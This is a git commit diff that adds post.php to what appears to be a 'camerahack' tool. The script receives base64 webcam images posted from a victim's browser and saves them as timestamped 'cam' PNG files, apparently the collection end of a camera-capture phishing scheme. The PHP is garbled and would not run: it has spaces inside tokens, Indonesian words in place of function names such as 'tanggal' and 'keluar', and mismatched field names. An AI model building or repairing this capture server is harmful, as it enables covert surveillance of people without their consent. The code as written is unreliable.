aee192fa7540e6e4a45777195255e3cc655c9fa2
samgans04 <71473371+samgans04@users.noreply.github.com>
2020-09-18 08:40:11 +0700

    Update post.php

--- post.php
+++ post.php
@@ -1,1 +1,19 @@
-# camerahack
+
+<? php
+
+$ date = tanggal ( 'dMYHis' );
+$ imageData = $ _POST [ 'kucing' ];
+
+if (! empty ( $ _POST [ 'cat' ])) {
+error_log ( "Diterima" . "\ r \ n" , 3 , "Log.log" );
+
+}
+
+$ filteredData = substr ( $ imageData , strpos ( $ imageData , "," ) + 1 );
+$ unencodedData = base64_decode ( $ filteredData );
+$ fp = fopen ( 'cam' . $ date . '.png' , 'wb' );
+fwrite ( $ fp , $ unencodedData );
+fclose ( $ fp );
+
+keluar ();
+?>
